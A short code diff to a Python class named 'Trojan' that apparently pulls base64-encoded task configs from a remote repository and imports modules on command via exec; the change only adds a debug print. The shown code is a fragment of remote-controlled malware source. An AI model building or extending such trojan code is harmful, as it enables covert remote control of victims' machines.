@@ -31,6 +31,7 @@ class Trojan:
         config_json = getContent('config', self.config_file, self.repo)
         config = json.loads(base64.b64decode(config_json))
         for task in config:
+            print(task)
             if task['module'] not in sys.modules:
                 exec("import %s" % task['module'])
             return config
